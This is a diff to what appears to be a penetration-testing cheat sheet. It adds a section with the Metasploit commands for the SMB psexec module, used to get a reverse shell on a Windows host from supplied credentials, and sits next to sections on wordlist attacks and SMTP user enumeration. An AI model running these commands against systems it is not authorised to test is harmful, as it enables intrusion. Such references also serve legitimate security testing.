@@ -20,6 +20,17 @@ set USERS_FILE <Wordlist>
 run
 ```
 
+# SMB
+##### Establish Reverse Shell with SMB
+```bash
+msfconsole
+use exploit/windows/smb/psexec
+set RHOSTS <Target Host>
+set SMBUser <Username>
+set SMBPass <Password>
+exploit
+```
+
 # SMTP
 ### Enumerate SMTP Users
 ```bash
